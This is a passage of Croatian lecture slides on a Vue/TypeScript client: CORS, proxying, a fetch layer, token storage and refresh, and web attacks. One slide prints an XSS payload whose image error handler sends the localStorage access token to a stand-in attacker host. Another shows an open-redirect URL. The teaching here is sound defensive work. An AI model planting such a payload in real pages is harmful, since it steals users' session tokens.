await fetch('http://127.0.0.1:8000/competitions/', {
  headers: { Authorization: `Bearer ${token}` },
})
\end{lstlisting}

\vspace{0.2em}
U konzoli Chromea:

\begin{lstlisting}
Access to fetch at 'http://127.0.0.1:8000/competitions/' from
origin 'http://127.0.0.1:5173' has been blocked by CORS policy:
Response to preflight request doesn't pass access control check ...
TypeError: Failed to fetch
\end{lstlisting}

\vspace{0.2em}
Backend je isti i zahtjev je isti, a skripta odgovor nije dobila.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Zahtjev koji u alatu prolazi (II)}
U zapisniku backenda za taj poziv nema retka s metodom \texttt{GET}. Stoji samo ovaj:

\begin{lstlisting}
"OPTIONS /competitions/ HTTP/1.1" 405 Method Not Allowed
\end{lstlisting}

\vspace{0.5em}
Zahtjev nije odbio backend. Preglednik ga je zaustavio prije slanja: najprije je pitao smije li ga poslati, nije dobio dopuštenje i pravi zahtjev nije poslao.

\vspace{0.9em}
Alat i preglednik razlikuju se po tome u čije ime šalju. Alat ne radi u ime nijedne stranice. Preglednik radi u ime stranice koju je korisnik otvorio i štiti korisnika od nje.
\end{frame}

% ============================================================
\sekcija{Zahtjev iz preglednika}{Izvor stranice, pravilo istoga izvora, dopuštenje i predzahtjev, posrednik na izvoru stranice.}

% ------------------------------------------------------------
\begin{frame}{Izvor stranice}
Izvor (engl. \emph{origin}) stranice čine tri podatka iz adrese: shema, ime domaćina i vrata. Putanja i upit ne ulaze u izvor. Za stranicu učitanu s \texttt{http://127.0.0.1:5173}:

\vspace{0.7em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{6.9cm}L{1.6cm}L{2.6cm}@{}}
  \toprule
  \textbf{Adresa} & \textbf{Izvor} & \textbf{Razlikuje se} \\
  \midrule
  \texttt{http://127.0.0.1:5173/natjecanja} & isti & ništa \\
  \texttt{http://127.0.0.1:8000/competitions/} & drugi & vrata \\
  \texttt{https://127.0.0.1:5173/} & drugi & shema \\
  \texttt{http://localhost:5173/} & drugi & ime domaćina \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
Imena \texttt{localhost} i \texttt{127.0.0.1} vode na isto računalo, ali preglednik izvore uspoređuje kao tekst, pa su to dva izvora.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Pravilo istoga izvora}
Korisnik je u jednoj kartici prijavljen u \emph{webmail}, a u drugoj otvori nepoznatu stranicu. Kad bi skripta te stranice smjela čitati odgovore s bilo kojeg izvora, mogla bi u ime korisnika dohvatiti njegovu poštu i poslati je dalje.

\vspace{0.9em}
Preglednik zato skripti predaje samo odgovore s izvora s kojeg je stranica došla. To je \textbf{pravilo istoga izvora} (engl. \emph{same-origin policy}).

\vspace{0.9em}
Pravilo ograničava čitanje odgovora, a slanje mnogih zahtjeva ne zaustavlja. Zato ne zamjenjuje provjeru prava na poslužitelju.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Dopuštenje poslužitelja}
Iznimku od pravila daje poslužitelj kojemu zahtjev ide. Uz odgovor šalje zaglavlje koje imenuje izvor kojemu se odgovor smije pokazati:

\begin{lstlisting}
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://127.0.0.1:5173
\end{lstlisting}

\vspace{0.5em}
Preglednik odgovor predaje skripti samo ako je izvor stranice naveden u tom zaglavlju. Mehanizam se zove CORS, dijeljenje među izvorima (engl. \emph{cross-origin resource sharing}).

\vspace{0.5em}
Dopuštenje zapisuje poslužitelj i ondje se mijenja. Klijent ga ne može ni dodati ni zaobići.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Predzahtjev}
Dio zahtjeva preglednik ne šalje odmah:

\vspace{0.4em}
\begin{itemize}
  \itemsep0.45em
  \item Jednostavan zahtjev, na primjer \texttt{GET} bez vlastitih zaglavlja, šalje se odmah. Bez dopuštenja odgovor stigne, ali ga skripta ne dobije.
  \item Zahtjev s tijelom u JSON-u, metodom \texttt{PATCH} ili \texttt{DELETE} ili sa zaglavljem \texttt{Authorization} preglednik najprije najavljuje zasebnim zahtjevom metodom \texttt{OPTIONS}. To je \textbf{predzahtjev} (engl. \emph{preflight}).
  \item Tek ako odgovor na predzahtjev dopušta izvor, metodu i zaglavlja, preglednik šalje pravi zahtjev.
\end{itemize}

\vspace{0.6em}
Gotovo svaki zahtjev ove aplikacije nosi token u zaglavlju \texttt{Authorization}. Uz dopuštenje bi svakome prethodio predzahtjev, osim dok preglednik pamti odgovor na raniji.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Posrednik}
Pošta upućena ustanovi stiže u pisarnicu, koja je prosljeđuje uredu. Pošiljatelj zna jednu adresu, a ured može seliti bez obavijesti pošiljateljima.

\vspace{0.9em}
\textbf{Posrednik} (engl. \emph{proxy}) na isti način prima zahtjeve na adresi stranice i prosljeđuje ih backendu. Preglednik tada i stranicu i podatke dobiva s istog izvora, pa pravilo istoga izvora ne smeta i dopuštenje nije potrebno.

\vspace{0.9em}
Backend o tome ništa ne zna. Zahtjev mu stiže od posrednika, a ne iz preglednika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Put zahtjeva do API-ja}
\begin{center}
\begin{tikzpicture}[
  font=\small,
  kut/.style={draw=lineclr,fill=tint,rounded corners=2pt,inner sep=5pt,minimum height=9mm,align=center},
  str/.style={-{Stealth[length=2mm]},draw=ink2,thick},
  stop/.style={-{Stealth[length=2mm]},draw=mutedclr,thick,dashed}
]
  \node[kut] (b1) at (0,2.4) {preglednik\\[-2pt]{\scriptsize stranica s :5173}};
  \node[kut] (s1) at (10.0,2.4) {backend\\[-2pt]{\scriptsize 127.0.0.1:8000}};
  \draw[stop] (b1.east) -- node[above,font=\scriptsize]{\texttt{OPTIONS} na \texttt{127.0.0.1:8000}}
                           node[below,font=\scriptsize]{\texttt{405}: \texttt{GET} se ne šalje} (s1.west);

  \node[kut] (b2) at (0,0) {preglednik\\[-2pt]{\scriptsize stranica s :5173}};
  \node[kut] (v) at (5.0,0) {Vite\\[-2pt]{\scriptsize 127.0.0.1:5173}};
  \node[kut] (s2) at (10.0,0) {backend\\[-2pt]{\scriptsize 127.0.0.1:8000}};
  \draw[str] (b2.east) -- node[above,font=\scriptsize,align=center]{\texttt{/api/}\\[-2pt]\texttt{competitions/}} (v.west);
  \draw[str] (v.east) -- node[above,font=\scriptsize,align=center]{\texttt{/competitions/}} (s2.west);

  \node[font=\scriptsize,color=mutedclr] at (5.0,3.35) {izravno, na drugi izvor};
  \node[font=\scriptsize,color=mutedclr] at (5.0,0.95) {preko posrednika, na izvoru stranice};
\end{tikzpicture}
\end{center}

\vspace{0.5em}
U donjem putu preglednik ni u jednom koraku ne vidi drugi izvor. Posrednik iz adrese uklanja predmetak \texttt{/api}, pa backend dobiva svoje rute nepromijenjene.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Dopuštenje i posrednik}
\vspace{0.3em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{2.4cm}L{4.0cm}L{5.0cm}@{}}
  \toprule
   & \textbf{Dopuštenje CORS} & \textbf{Posrednik na izvoru stranice} \\
  \midrule
  Zahtjev ide na & adresu backenda & adresu stranice, pod \texttt{/api} \\
  Postavka & popis izvora na backendu & pravilo na posredniku \\
  Predzahtjev & uz zahtjeve s tokenom & ne postoji \\
  Cijena & popis izvora po okruženju & posrednik u svakom okruženju \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
\begin{konvencija}[Izbor, ne pravilo]
Oba puta su ispravna. Projekt bira posrednika, jer API i korisničko sučelje izlaze zajedno, pa backend nema postavku za CORS.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Posrednik u razvoju}
\begin{lstlisting}[language=typescript]
// vite.config.ts
const BACKEND = 'http://127.0.0.1:8000'
const proxy = {
  '/api': {
    target: BACKEND,
    rewrite: (path: string) => path.replace(/^\/api/, ''),
  },
}
export default defineConfig({
  ...
  server: { host: '127.0.0.1', port: 5173, strictPort: true, proxy },
})
\end{lstlisting}

\vspace{0.3em}
Razvojni poslužitelj zahtjev na \texttt{/api/competitions/} prosljeđuje backendu kao \texttt{/competitions/}. U produkciji isto pravilo nosi web poslužitelj ispred aplikacije.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Vježba: zahtjev s drugog izvora}
Backend i razvojni poslužitelj rade. Stranica \texttt{http://127.0.0.1:5173} je otvorena, s konzolom i karticom Mreža.

\begin{lstlisting}[language=typescript]
await fetch('http://127.0.0.1:8000/health/')             // A
await (await fetch('/api/health/')).json()                // B
await fetch('http://127.0.0.1:8000/health/',
  { headers: { Authorization: 'Bearer x' } })             // C
\end{lstlisting}

\begin{enumerate}
  \itemsep0.15em
  \item Pošaljite zahtjev A i u kartici Mreža zabilježite je li poslan i s kojim statusom.
  \item Pošaljite zahtjev B, pa u terminalu backenda usporedite retke koje su ostavili A i B.
  \item Pošaljite zahtjev C i pronađite njegov redak u terminalu backenda.
\end{enumerate}

\vspace{0.2em}
Zašto je backend na zahtjev A odgovorio, a skripta odgovor nije dobila, i zašto uz zahtjev C nema retka s metodom \texttt{GET}?
\end{frame}

% ============================================================
\sekcija{Jedno mjesto za slanje zahtjeva}{Posao koji se ponavlja u svakom pozivu, odgovor sa statusom pogreške, sloj nad funkcijom fetch, pozivi po resursu, adresa bez kose crte na kraju i čekanje odgovora.}

% ------------------------------------------------------------
\begin{frame}[fragile]{Posao koji se ponavlja}
Zahtjev napisan izravno u komponenti nosi i sve što uz njega ide:

\begin{lstlisting}[language=typescript]
const token = localStorage.getItem('plreg.access_token')
const res = await fetch('/api/competitions/?limit=100', {
  headers: {
    Accept: 'application/json',
    Authorization: `Bearer ${token}`,
  },
})
if (!res.ok) throw new Error(String(res.status))
const competitions = await res.json()
\end{lstlisting}

\vspace{0.3em}
Adresa API-ja, zaglavlja, token, provjera statusa i pretvorba iz JSON-a isti su u svakom pozivu.

\vspace{0.3em}
Kad stoje u svakoj komponenti, mijenjaju se u svakoj komponenti, a u nekoj se zaborave. Komponenta koja zaboravi provjeru statusa tijelo pogreške prikaže kao podatke.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Odgovor sa statusom pogreške}
\begin{lstlisting}[language=typescript]
const res = await fetch('/api/nepostojeca-ruta')
res.ok             // false
res.status         // 404
await res.json()   // { code: 'not_found', message: 'Not Found' }
\end{lstlisting}

\vspace{0.5em}
Obećanje koje vraća \texttt{fetch} odbija se samo kad odgovora nema: backend ne radi ili veze nema. Odgovor sa statusom \texttt{404} ili \texttt{500} za \texttt{fetch} je uspješno primljen odgovor, a o statusu odlučuje onaj tko odgovor čita.

\vspace{0.5em}
Knjižnice za zahtjeve, poput axiosa, odgovor sa statusom \texttt{4xx} ili \texttt{5xx} same pretvaraju u iznimku. Uz \texttt{fetch} to radi vlastiti kod, jednom.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Smjer poziva}
\begin{center}
\begin{tikzpicture}[
  font=\small,
  kut/.style={draw=lineclr,fill=tint,rounded corners=2pt,inner sep=5pt,minimum height=8mm},
  str/.style={-{Stealth[length=2mm]},draw=ink2,thick}
]
  \node[kut] (v) at (0,0) {\texttt{views}, \texttt{components}};
  \node[kut] (s) at (3.9,0.9) {\texttt{stores}};
  \node[kut] (r) at (3.9,-0.9) {\texttt{api/<resurs>.ts}};
  \node[kut] (h) at (7.5,0) {\texttt{api/http.ts}};
  \node[kut] (f) at (10.2,0) {\texttt{fetch}};
  \draw[str] (v.east) -- (s.west);
  \draw[str] (v.east) -- (r.west);
  \draw[str] (s.south) -- (r.north);
  \draw[str] (r.east) -- (h.west);
  \draw[str] (h.east) -- (f.west);
\end{tikzpicture}
\end{center}

\vspace{0.5em}
Pogledi i komponente ne zovu \texttt{fetch}. Zovu funkciju iz \codefile{api/<resurs>.ts} ili pohranu, a jedini poziv \texttt{fetch} u projektu stoji u \codefile{api/http.ts}. Poziv ide samo prema desno: \codefile{http.ts} ne zna za Vue, pohrane ni router.

\vspace{0.4em}
\begin{konvencija}[Izbor, ne pravilo]
Projekt koristi \texttt{fetch} bez knjižnice za zahtjeve. Posao koji bi knjižnica radila stoji u jednoj datoteci, koja se može pročitati u cijelosti.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Adresa API-ja}
\begin{lstlisting}[language=typescript]
// src/api/http.ts
export const API_BASE: string =
  import.meta.env.VITE_API_URL ?? '/api'
\end{lstlisting}

\vspace{0.5em}
Adresa API-ja je relativna, pa zahtjev ide izvoru stranice, a dalje ga nosi posrednik. Svi pozivi u projektu grade adresu od ove vrijednosti.

\vspace{0.5em}
Kad je API na drugoj adresi, ona se zadaje pri izgradnji varijablom \texttt{VITE\_API\_URL}. Backend tada mora dopustiti izvor stranice, jer posrednika na tom putu nema.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Slanje zahtjeva (I)}
\begin{lstlisting}[language=typescript]
// src/api/http.ts
async function send(method: Method, path: string,
                    options: RequestOptions): Promise<Response> {
  const headers: Record<string, string> = {
    Accept: 'application/json',
  }
  if (options.body !== undefined)
    headers['Content-Type'] = 'application/json'
  const token = options.auth === false ? null : getAccessToken()
  if (token) headers.Authorization = `Bearer ${token}`
  ...  <@\komts{slanje: sljedeći slajd}@>
}
\end{lstlisting}

\vspace{0.3em}
Token dodaje ova funkcija, pa ga nijedan poziv u \codefile{api} ne spominje i nijedan ga ne može zaboraviti. Prijava i obnova šalju \texttt{auth: false}, jer token tek dobivaju.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Slanje zahtjeva (II)}
\begin{lstlisting}[language=typescript]
// src/api/http.ts
async function send(...): Promise<Response> {
  ...  // zaglavlja i token
  try {
    return await fetch(
      `${API_BASE}${path}${buildQuery(options.query ?? {})}`,
      { method, headers, body: options.body === undefined
          ? undefined : JSON.stringify(options.body) })
  } catch {
    throw new ApiError(0, {
      code: 'network_error', message: <@'Poslužitelj nije dostupan. ...'@> })
  }
}
\end{lstlisting}

\vspace{0.1em}
Bez odgovora nema ni statusa, pa pogreška dobiva status \texttt{0} i kod \texttt{network\_error}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Pogreška sa statusom i kodom}
\begin{lstlisting}[language=typescript]
// src/api/http.ts
export class ApiError extends Error {
  readonly status: number
  readonly code: string
  readonly fieldErrors: FieldError[]
  constructor(status: number, body: ErrorBody) {
    super(body.message)
    this.name = 'ApiError'
    this.status = status
    this.code = body.code
    this.fieldErrors = body.errors ?? []
  }
}
\end{lstlisting}

\vspace{0.2em}
Backend uz pogrešku šalje \texttt{code} i \texttt{message}, a uz \texttt{422}, kojim javlja da tijelo ne odgovara shemi, i popis polja \texttt{errors}. Status opisuje ishod zahtjeva, \texttt{code} je stalan i služi grananju obrade, a \texttt{message} je tekst za korisnika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Odgovor koji nije JSON}
Kad backend ne radi, odgovara posrednik, svojom stranicom ili praznim tijelom. Tijelo tada ne prolazi pretvorbu iz JSON-a i nema polja \texttt{code}.

\vspace{0.9em}
Funkcija \texttt{toApiError} u \codefile{api/http.ts} takav odgovor korisniku ne prikazuje. Pogreška dobiva kod \texttt{http\_error} i poruku prema statusu: za \texttt{502} do \texttt{504} da poslužitelj trenutno ne odgovara, a za ostale statusni kod.

\vspace{0.9em}
Korisnik tako uvijek dobiva rečenicu na hrvatskom, a ne HTML posrednika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Pozivi po resursu}
\begin{lstlisting}[language=typescript]
// src/api/auth.ts
export function login(username: string,
                      password: string): Promise<TokenPair> {
  return request('POST', '/auth/login',
                 { body: { username, password }, auth: false })
}
export function fetchMe(): Promise<User> {
  return request('GET', '/auth/me')
}
\end{lstlisting}

\vspace{0.3em}
Funkcija \texttt{request} iz \codefile{api/http.ts} šalje zahtjev i vraća tijelo odgovora s opisanim tipom. Datoteka po resursu skuplja njegove pozive: \codefile{api/auth.ts} prijavu, \codefile{api/competitions.ts} natjecanja.

\vspace{0.3em}
Komponenta ne zna ni adresu ni zaglavlja, nego samo to da postoji funkcija koja vraća korisnika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Adresa bez kose crte na kraju (I)}
Rute popisa na backendu završavaju kosom crtom. Zahtjev bez nje, poslan kroz posrednika:

\begin{lstlisting}
GET /api/competitions?limit=100

HTTP/1.1 307 Temporary Redirect
location: http://127.0.0.1:5173/competitions/?limit=100
\end{lstlisting}

\vspace{0.5em}
Backend odgovara preusmjerenjem na adresu s kosom crtom. Adresu sastavlja iz zaglavlja \texttt{Host}, u kojem je izvor stranice, i iz putanje koju je primio.

\vspace{0.5em}
Putanja je stigla bez \texttt{/api}, jer ga je posrednik uklonio. Preusmjerenje tako vodi na adresu stranice bez predmetka.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Adresa bez kose crte na kraju (II)}
Preglednik preusmjerenje slijedi sam, bez znanja skripte, i šalje zahtjev na \texttt{/competitions/} na izvoru stranice. Ta adresa ne počinje s \texttt{/api}, pa je posrednik ne prosljeđuje backendu, a odgovor nije popis natjecanja.

\vspace{0.5em}
Zato sve adrese popisa u klijentu završavaju kosom crtom, kao rute na backendu:

\begin{lstlisting}[language=typescript]
// src/api/competitions.ts
<@\komts{Adrese popisa završavaju kosom crtom, kao rute na backendu.}@>
...
export function fetchCompetitions(): Promise<Competition[]> {
  return request('GET', '/competitions/', { query: { limit: 100 } })
}
\end{lstlisting}

\vspace{0.3em}
Isti zahtjev poslan izravno backendu ne bi pokazao kvar, jer bi preusmjerenje vodilo na ispravnu adresu.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Čekanje odgovora}
\begin{lstlisting}[language=typescript]
// src/views/CompetitionsView.vue, <script setup>
const competitions = ref<Competition[]>([])
const loading = ref(false)
async function load() {
  loading.value = true
  try {
    competitions.value = await fetchCompetitions()
  } finally {
    loading.value = false
  }
}
onMounted(load)
\end{lstlisting}

\vspace{0.3em}
\texttt{await} zaustavlja samo funkciju \texttt{load}. Preglednik za to vrijeme iscrtava prikaz i odgovara na klikove, pa stanje \texttt{loading} mora biti vidljivo u predlošku. \texttt{finally} ga vraća i kad zahtjev ne uspije.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Vježba: sloj za zahtjeve}
Prijavljeni ste kao klub \texttt{behemot@plreg.hr}, s otvorenom karticom Mreža. Sloj za zahtjeve uvozi se u konzoli kao modul razvojnog poslužitelja:

\begin{lstlisting}[language=typescript]
const { request } = await import('/src/api/http.ts')
await request('GET', '/competitions/9999').catch((e) => e)     // A
await request('GET', '/competitions/', { query: { limit: '' } }) // B
await request('GET', '/competitions/', { query: { limit: 0 } })  // C
await fetch('/api/competitions')                                 // D
\end{lstlisting}

\begin{enumerate}
  \itemsep0.15em
  \item Pošaljite A i zabilježite polja \texttt{status}, \texttt{code} i \texttt{message}.
  \item Pošaljite B i C i usporedite njihove adrese u kartici Mreža.
  \item Pošaljite D i u kartici Mreža pogledajte status i zaglavlje \texttt{location}.
  \item Zaustavite backend s \kbd{Ctrl+C}, ponovite A, pa backend ponovno pokrenite.
\end{enumerate}

\vspace{0.2em}
Zašto je samo jedan od zahtjeva B i C nosio \texttt{limit}, i tko je odgovorio u četvrtom koraku?
\end{frame}

% ============================================================
\sekcija{Prijava i token}{Odgovor na prijavu, napadi na token u pregledniku, mjesto tokena, pohrana prijavljenog korisnika, obrazac za prijavu i povratak na traženu stranicu.}

% ------------------------------------------------------------
\begin{frame}[fragile]{Odgovor na prijavu}
Prijava je jedan zahtjev s korisničkim imenom i lozinkom:

\begin{lstlisting}
POST /api/auth/login
{"username": "behemot@plreg.hr", "password": "..."}

{"access_token": "eyJhbGciOiJIUzI1NiIs...",
 "refresh_token": "eyJhbGciOiJIUzI1NiIs...",
 "token_type": "bearer"}
\end{lstlisting}

\vspace{0.3em}
Pristupni token (engl. \emph{access token}) ide uz svaki sljedeći zahtjev i vrijedi kratko, u ovom projektu petnaest minuta. Token za obnovu (engl. \emph{refresh token}) šalje se samo na \texttt{/auth/refresh}, vrijedi dulje, u ovom projektu sedam dana, i daje novi par.

\vspace{0.3em}
Tko je prijavljen, odgovor ne kaže. To vraća \texttt{GET /auth/me}, prema zapisu u bazi.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Napad koji uzima token}
Stranica koja tuđi tekst ugradi kao HTML dopušta da se uz njega izvede i skripta. Umjesto imena natjecatelja upisan je ovaj tekst:

\begin{lstlisting}[language=html]
<img src="x" onerror="fetch('https://napadac.example/?t='
  + localStorage.getItem('plreg.access_token'))">
\end{lstlisting}

\vspace{0.4em}
Ugrađen kao HTML, kod se izvodi u kartici korisnika, s izvorom aplikacije, pa vidi sve što vidi i aplikacija. Takav napad zove se XSS (engl. \emph{cross-site scripting}).

\vspace{0.4em}
Vue svaki izraz u predlošku, \texttt{\{\{ ... \}\}}, ispisuje kao tekst, pa ovakvo ime ostaje niz znakova. Direktiva \texttt{v-html} to zaobilazi i dolazi u obzir samo za sadržaj kojemu se vjeruje. Projekt je ne koristi.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Kolačić i zahtjev s tuđe stranice}
Preglednik kolačić šalje uz svaki zahtjev prema adresi kojoj kolačić pripada, osim kad to ograniči atribut \texttt{SameSite}. Šalje ga i kad zahtjev pokrene tuđa stranica.

\vspace{0.9em}
Obrazac na tuđoj stranici tako može izvesti radnju u ime prijavljenog korisnika. Takav napad zove se CSRF (engl. \emph{cross-site request forgery}).

\vspace{0.9em}
Preglednik token u zaglavlje \texttt{Authorization} ne dodaje sam. Dodaje ga skripta aplikacije, pa zahtjev koji pokrene tuđa stranica ostaje bez njega. Cijena tog izbora je izloženost XSS-u: token koji čita skripta aplikacije čita i ubačena skripta.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Mjesto tokena u pregledniku}
\vspace{0.3em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{3.7cm}L{1.9cm}L{2.4cm}L{3.0cm}@{}}
  \toprule
   & \textbf{Memorija} & \textbf{\texttt{localStorage}} & \textbf{Kolačić \texttt{HttpOnly}} \\
  \midrule
  Nakon osvježavanja & nestaje & ostaje & ostaje \\
  Čita ga skripta & da & da & ne \\
  Uz zahtjev ga dodaje & skripta & skripta & preglednik sam \\
  Otvoren napadu & XSS & XSS & CSRF \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.7em}
Nijedno mjesto nije bez cijene. Razlikuju se po tome tko token može uzeti i koliko dugo vrijedi ono što uzme: token iz memorije nestaje s karticom, a onaj iz \texttt{localStorage} vrijedi do isteka.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Spremanje tokena}
\begin{lstlisting}[language=typescript]
// src/api/tokens.ts
const ACCESS_KEY = 'plreg.access_token'
const REFRESH_KEY = 'plreg.refresh_token'
...
export function saveTokens(pair: TokenPair) {
  write(ACCESS_KEY, pair.access_token)
  write(REFRESH_KEY, pair.refresh_token)
}
\end{lstlisting}

\texttt{localStorage} pripada izvoru, a na \texttt{http://127.0.0.1:5173} redom rade svi projekti pokrenuti razvojnim poslužiteljem. Ključevi zato nose predmetak aplikacije.

\vspace{0.1em}
\begin{konvencija}[Izbor, ne pravilo]
U ovom projektu oba tokena stoje u \texttt{localStorage}, jer prijava mora preživjeti osvježavanje stranice, a backend token prima u zaglavlju.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Prijavljeni korisnik}
\begin{lstlisting}[language=typescript]
// src/stores/auth.ts
export const useAuthStore = defineStore('auth', () => {
  const user = ref<User | null>(null)
  <@\komts{true kad je restore() završio}@>
  const ready = ref(false)
  const isLoggedIn = computed(() => user.value !== null)
  const isAdmin = computed(() => user.value?.role === 'admin')
  const clubId = computed(() => user.value?.club_id ?? null)
  ...
  return { user, ready, isLoggedIn, isAdmin, clubId,
           restore, login, forget }
})
\end{lstlisting}

\vspace{0.3em}
Korisnika čitaju navigacija, provjera prije navigacije i gotovo svaki popis, pa stoji u pohrani (engl. \emph{store}) biblioteke Pinia, koju dijele sve komponente. Tokeni ostaju u \codefile{api/tokens.ts}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Prijava i zaboravljanje}
\begin{lstlisting}[language=typescript]
// src/stores/auth.ts
async function login(username: string, password: string) {
  saveTokens(await apiLogin(username, password))
  user.value = await fetchMe()
}

function forget() {
  clearTokens()
  user.value = null
}
\end{lstlisting}

\vspace{0.5em}
Prijava najprije sprema par tokena, pa tek onda dohvaća korisnika, jer \texttt{GET /auth/me} već nosi novi pristupni token.

\vspace{0.5em}
\texttt{forget} briše tokene i korisnika iz ove kartice. Izdani token time ne prestaje vrijediti na poslužitelju, nego prestaje biti dostupan aplikaciji.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Obrazac za prijavu}
\begin{lstlisting}[language=html]
<!-- src/views/LoginView.vue -->
<form @submit.prevent="submit">
  ...  <!-- oznake polja i omota<@č@>i -->
  <input id="username" v-model="username"
         autocomplete="username" required />
  <input id="password" v-model="password" type="password"
         autocomplete="current-password" required />
  <p v-if="error" class="form-error" role="alert">{{ error }}</p>
  <button class="btn" type="submit" :disabled="pending">...</button>
</form>
\end{lstlisting}

\vspace{0.3em}
Bez \texttt{.prevent} preglednik bi obrazac poslao sam i učitao stranicu ispočetka, a s njom bi nestala pokrenuta aplikacija.

\vspace{0.3em}
\texttt{autocomplete} govori upravitelju lozinki koje je polje koje. \texttt{role="alert"} čitaču zaslona javlja poruku o pogrešci čim se pojavi.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Slanje obrasca}
\begin{lstlisting}[language=typescript]
// src/views/LoginView.vue
async function submit() {
  error.value = ''
  pending.value = true
  try {
    await auth.login(username.value.trim(), password.value)
    await router.replace(safeRedirect(route.query.redirect))
  } catch (e) {
    if (!(e instanceof ApiError)) throw e
    error.value = e.message
  } finally {
    pending.value = false
  }
}
\end{lstlisting}

\vspace{0.2em}
Poruka poslužitelja ista je za nepoznato ime i za krivu lozinku, pa ne odaje postoji li račun. \texttt{replace} zamjenjuje adresu obrasca u povijesti preglednika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Povratak na traženu stranicu (I)}
Neprijavljeni korisnik koji otvori \texttt{/natjecatelji} dobiva obrazac na adresi \texttt{/prijava?redirect=/natjecatelji}, a nakon prijave vraća se na \texttt{/natjecatelji}.

\vspace{0.5em}
Parametar je u adresi, pa ga može postaviti bilo tko:

\begin{lstlisting}
http://127.0.0.1:5173/prijava?redirect=https://napadac.example
\end{lstlisting}

\vspace{0.5em}
Kad aplikacija takvu vrijednost preda pregledniku, na primjer s \texttt{window.location.assign}, korisnik se prijavi na pravoj adresi i završi na tuđoj stranici koja izgleda kao njezina. Takav propust zove se otvoreno preusmjeravanje (engl. \emph{open redirect}).
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Povratak na traženu stranicu (II)}
\begin{lstlisting}[language=typescript]
// src/lib/navigation.ts
export function safeRedirect(value: unknown): string {
  if (typeof value !== 'string') return '/'
  <@\komts{"//host" i "/\textbackslash host" preglednik čita kao adresu}@>
  <@\komts{drugog domaćina}@>
  if (!value.startsWith('/') || value.startsWith('//')
      || value.startsWith('/\\')) return '/'
  return value
}
\end{lstlisting}

\vspace{0.4em}
Vrijednost iz adrese je ulaz kao i tijelo zahtjeva, pa se provjerava prije uporabe. Propušta se samo putanja unutar aplikacije, a sve ostalo vodi na početnu stranicu.

\vspace{0.4em}
Router putanju tumači unutar aplikacije, ali provjera ne smije ovisiti o tome koji će kod vrijednost jednom pročitati.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Vježba: prijava i povratak}
Backend i razvojni poslužitelj rade. Koristite račun kluba \texttt{behemot@plreg.hr}.

\vspace{0.6em}
\begin{enumerate}
  \itemsep0.4em
  \item Odjavite se, pa u adresnu traku upišite \texttt{http://127.0.0.1:5173/natjecatelji}.
  \item Prijavite se i zabilježite adresu na kojoj je aplikacija završila.
  \item U alatima za razvoj, kartica Application, pod Local Storage pogledajte zapisane ključeve.
  \item Odjavite se, otvorite \texttt{/prijava?redirect=//example.com} i prijavite se.
  \item Odjavite se i pokušajte se prijaviti s krivom lozinkom, pa s korisničkim imenom koje ne postoji.
\end{enumerate}

\vspace{0.6em}
Kamo vas je aplikacija odvela u četvrtom koraku i zašto se poruke u petom koraku ne razlikuju?
\end{frame}

% ============================================================
\sekcija{Token koji istekne}{Zahtjev koji prestane prolaziti, obnova i ponavljanje zahtjeva, istodobni zahtjevi s isteklim tokenom, izgubljena prijava i stanje nakon osvježavanja stranice.}

% ------------------------------------------------------------
\begin{frame}{Zahtjev koji prestane prolaziti}
Klub se prijavio, radio dvadeset minuta i otvorio popis natjecanja. Zahtjev je isti kao i svi prije njega, a odgovor je \texttt{401} s kodom \texttt{token\_expired}.

\vspace{0.9em}
Pristupni token vrijedi kratko, u ovom projektu petnaest minuta, i to namjerno: token koji dospije u tuđe ruke uskoro prestaje vrijediti.

\vspace{0.9em}
Prijava nakon svakog isteka nije prihvatljiva za korisnika. Token za obnovu daje novi par bez lozinke, a klijent ga mora upotrijebiti sam, bez sudjelovanja korisnika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Obnova i ponavljanje zahtjeva}
\begin{lstlisting}[language=typescript]
// src/api/http.ts
export async function request<T>(
  method: Method, path: string, options: RequestOptions = {},
): Promise<T> {
  let res = await send(method, path, options)
